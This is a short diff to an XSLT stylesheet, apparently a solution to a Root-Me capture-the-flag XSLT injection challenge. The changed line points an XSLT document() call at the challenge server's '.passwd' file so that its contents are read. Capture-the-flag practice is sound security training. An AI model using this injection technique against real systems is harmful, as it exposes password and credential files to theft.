@@ -18,6 +18,6 @@ xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   </table>
   
 </xsl:template>
-<xsl:param name="file2" select="document('.passwd')"/>
+<xsl:param name="file2" select="document('http://challenge01.root-me.org/web-serveur/ch50/.passwd')"/>
 
 </xsl:stylesheet>
